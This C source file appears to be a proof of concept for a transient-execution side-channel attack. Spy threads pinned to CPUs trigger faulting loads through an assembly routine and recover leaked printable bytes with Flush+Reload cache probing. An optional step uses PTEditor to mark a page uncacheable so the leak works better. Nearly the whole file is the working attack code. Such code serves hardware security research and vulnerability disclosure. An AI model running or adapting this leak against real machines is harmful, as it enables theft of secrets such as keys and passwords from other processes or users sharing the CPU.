
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/sysinfo.h>
#include <sys/mman.h>

#include "config.h"
#include "cacheutils.h"

#define PAGE_SIZE 4096

uint8_t __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];

/* see asm.S */

extern uint64_t CACHE_THRESHOLD;
extern uint8_t *address_normal;
extern uint8_t *address_UC;
extern uint8_t *oracles;

extern void s_load_encode(uint32_t *perm, uint8_t *oracle);

void set_cpu(int cpuid)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpuid, &cpuset);
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0)
    {
        printf("pthread_setaffinity_np failed!");
        exit(1);
    }
}

void setup_oracle()
{
    // printf("[+] Flush+Reload Threshold: ");
    CACHE_MISS = detect_flush_reload_threshold();
}
#if ASSIST_UC

#include "../third_party/PTEditor/ptedit_header.h"

void setup_pages()
{
    ptedit_init();

    int mt_type[] = {PTEDIT_MT_UC, PTEDIT_MT_WC, PTEDIT_MT_WT};
    int mt[sizeof(mt_type) / sizeof(int)];
    for (int i = 0; i < sizeof(mt) / sizeof(int); i++)
    {
        mt[i] = ptedit_find_first_mt(mt_type[i]);
        if (mt[i] == -1)
        {
            printf("MT not available!\n");
            exit(1);
        }
    }

    uint8_t *ptr = NULL;
    ptedit_entry_t entry;

    ptr = (uint8_t *)&address_normal;
    ptr[0] = ptr[0] + 1 - 1;

    ptr = (uint8_t *)&address_UC;
    ptr[0] = ptr[0] + 1 - 1;
    entry = ptedit_resolve(ptr, 0);
    entry.pte = ptedit_apply_mt(entry.pte, mt[0]);
    entry.valid = PTEDIT_VALID_MASK_PTE;
    ptedit_update(ptr, 0, &entry);

    ptedit_cleanup();
}

#endif

uint32_t perm[16] = {0};

void *spy(void *ptr)
{

    int oracle_i = *(int *)(ptr);
    set_cpu(oracle_i % get_nprocs());
    int cpu = sched_getcpu();

    srand(time(0));

    while (1)
    {

        int perm_idx = rand() % 16;

        for (int i = 0; i < 16; i++)
        {
            perm[i] = i + perm_idx;
        }

        uint8_t *target_oracle = (uint8_t *)&oracles + oracle_i * 8 * 256 * PAGE_SIZE;

        if (!setjmp(trycatch_buf))
            s_load_encode(perm, target_oracle);

        char indexes[BYTE_TRY + 1];
        memset(indexes, 0, BYTE_TRY + 1);

        for (size_t c = 0; c < BYTE_TRY; c++)
        {
            for (size_t i = ' '; i < '~'; i++)
            {
                int mix_i = i;
                if (flush_reload(target_oracle + (mix_i + (c * 256)) * PAGE_SIZE))
                {
                    indexes[c] = (mix_i + (c * 256)) % 256;
                }
            }
        }

        size_t l = strlen(indexes);
        if (l >= 4)
        {
            fprintf(stdout, "cpu_%d_vector[%d]: %s\n", cpu, perm_idx, indexes);
            fflush(stdout);
        }
    }
}

int main(int argc, char *argv[])
{

#if ASSIST_UC
    setup_pages();
#endif

    CACHE_MISS = detect_flush_reload_threshold();

    pthread_t tSpy[CPU_TRY] = {0};

    for (int i = 0; i < CPU_TRY; i++)
    {
        pthread_create(&(tSpy[i]), NULL, spy, &i);
    }

    for (int i = 0; i < CPU_TRY; i++)
    {
        void *ret;
        pthread_join(tSpy[i], &ret);
    }

    return 0;
}
